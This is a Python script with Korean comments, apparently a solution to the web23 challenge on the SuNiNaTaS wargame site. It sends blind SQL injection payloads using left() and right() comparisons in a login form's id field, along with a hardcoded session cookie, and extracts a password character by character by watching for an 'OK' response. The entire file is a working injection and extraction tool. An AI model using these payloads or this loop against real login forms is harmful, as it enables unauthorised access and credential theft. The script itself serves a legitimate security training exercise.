from http import client

conn = client.HTTPConnection('suninatas.com',80)

headers={'Content-Type':'application/x-www-form-urlencoded',
         'Cookie':'ASPSESSIONIDQSTDCASD=LJJMIBEBKNELGOLFFGFAFICO'}
url = '/Part_one/web23/web23.asp'

passwd = ""
#passwd의 길이가 12인것은 ad'+'min'and(len(pw)=12)-- 을 이용해 알아냄

for ascii_num in range(33,127):
    body="id=ad'+'min'and(left(pw,1)='"+chr(ascii_num)+"')--&pw=1234"
    conn.request('POST',url,body,headers)
    res=conn.getresponse()
    resData=res.read()
    strRes = str(resData)
    if(chr(ascii_num)=='V'): #첫번째 글자에서 쿼리가 제대로 날아가도 OK글자가 안나와서 이렇게 변경
        passwd = passwd+chr(ascii_num)
        break
print(passwd)
for length in range(2,11):
    for ascii_num in range(33,127):
        body="id='or(left(pw,%d)='"%length+passwd+chr(ascii_num)+"')--&pw=1234"
        conn.request('POST',url,body,headers)
        res=conn.getresponse()
        resData=res.read()
        strRes = str(resData)
        if(strRes.find("OK")>-1):
            passwd = passwd+chr(ascii_num)
            break
print(passwd)
right_passwd = "" #id칸의 30자 길이제한으로 인해 최우측 3글자는 right함수를 이용
for length in range(1,4):
    for ascii_num in range(33,127):
        body="id='or(right(pw,%d)='"%length+chr(ascii_num)+right_passwd+"')--&pw=1234"
        conn.request('POST',url,body,headers)
        res=conn.getresponse()
        resData=res.read()
        strRes = str(resData)
        if(strRes.find("OK")>-1):
            right_passwd = chr(ascii_num)+right_passwd
            break
print(passwd+right_passwd)
last_passwd = passwd+right_passwd
print(last_passwd.lower()) #문제풀이 인증시에 소문자만 인증되므로 소문자로 변경
